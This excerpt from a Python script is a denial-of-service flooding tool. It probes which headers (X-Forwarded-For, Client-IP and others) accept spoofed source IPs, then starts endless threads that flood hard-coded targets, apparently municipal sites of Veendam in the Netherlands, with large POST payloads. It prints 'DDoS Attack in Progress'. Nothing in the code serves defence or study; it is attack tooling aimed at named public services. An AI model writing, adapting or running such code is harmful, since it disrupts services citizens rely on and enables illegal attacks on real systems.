...
# Spoofed IPs for infinite loop block
spoofed_ips = ['37.200.85.24', '37.200.85.19', '127.0.0.1', '172.0.0.1']

# Target URLs for the additional request block
infinite_loop_urls = [
    "https://veendam.nl/",
    "http://loket.veendam.nl",
    "http://veendam.mijnafspraak.nl",
    "http://portal.veendam.nl"
]

# Common headers to test for injection
test_headers = [
    'X-Forwarded-For', 
    'Client-IP', 
    'True-Client-IP', 
...
def scan_headers(url):
    injectable_headers = []
    test_ip = random.choice(spoofed_ips)
    
    for header in test_headers:
        try:
            test_headers_payload = {
                header: test_ip,
                'User-Agent': 'HeaderScanner',
            }
            req = urllib.request.Request(url, headers=test_headers_payload)
            response = urllib.request.urlopen(req)
            
            if response.status in (200, 301, 302, 403, 503):
                injectable_headers.append(header)
                print(Fore.GREEN + f"[SCAN] Header {header} appears injectable with IP {test_ip}")
        except Exception as e:
            print(Fore.RED + f"[SCAN] Header {header} failed with error: {e}")
    
    return injectable_headers

def is_site_alive(url, spoofed_ip):
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((spoofed_ip, 0))  # Bind to a spoofed IP and a random port
        sock.settimeout(5)  # Timeout for the connection
        host = url.split("//")[-1].split("/")[0]  # Extract the host from the URL
        sock.connect((host, 80))  # Connect to the HTTP port
        sock.close()
        return True
    except Exception as e:
        print(Fore.RED + f"[ERROR] Unable to connect to {url} with spoofed IP {spoofed_ip}: {e}")
        return False

class Spammer(threading.Thread):
    def __init__(self, url, number, proxy_list, injectable_headers):
        ...
        self.injectable_headers = injectable_headers
    ...
    def request(self):
        ...
        for header in self.injectable_headers:
            self.headers[header] = spoofed_ip
        ...
        print(Fore.YELLOW + f"DDoS Attack in Progress | Spoofed IP: {spoofed_ip}")
        print(Fore.RED + "0000000000000000000000000000")
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print(Fore.RED + f"Error in thread #{self.num}: {e}")
        sys.exit(0)

class InfiniteLoopRequester(threading.Thread):
    def __init__(self, url, injectable_headers, payload_size=10**6):
        threading.Thread.__init__(self)
        self.url = url
        self.injectable_headers = injectable_headers
    ...
    def run(self):
        while True:
            try:
                ...
                spoofed_ip = random.choice(spoofed_ips)
                for header in self.injectable_headers:
                    headers[header] = spoofed_ip

                data = generate_large_payload(self.payload_size)
                req = urllib.request.Request(self.url, data.encode('utf-8'), headers)
                urllib.request.urlopen(req)

                print(Fore.GREEN + f"Request sent to {self.url} with spoofed IP {spoofed_ip}")
            except Exception as e:
                print(Fore.RED + f"Error requesting {self.url}: {e}")
...
class MainLoop:
    ...
    def setup(self):
        ...
        while True:
            ...
            print(Fore.YELLOW + "[INFO] Scanning for injectable headers...")
            injectable_headers = scan_headers(url)
            if not injectable_headers:
                print(Fore.RED + "[ERROR] No injectable headers found. Aborting.")
                sys.exit(1)
            else:
                print(Fore.GREEN + f"[INFO] Injectable headers: {injectable_headers}")

            # Check if the target site is alive using spoofed IPs
            site_alive = False
            for spoofed_ip in spoofed_ips:
                if is_site_alive(url, spoofed_ip):
                    site_alive = True
                    break
            
            if not site_alive:
                print(Fore.RED + "[ERROR] All spoofed IPs failed to connect. Aborting.")
                sys.exit(1)
        ...
        for i in range(num_threads):
            Spammer(url, i + 1, proxy_list, injectable_headers).start()

        for site in infinite_loop_urls:
            InfiniteLoopRequester(site, injectable_headers).start()
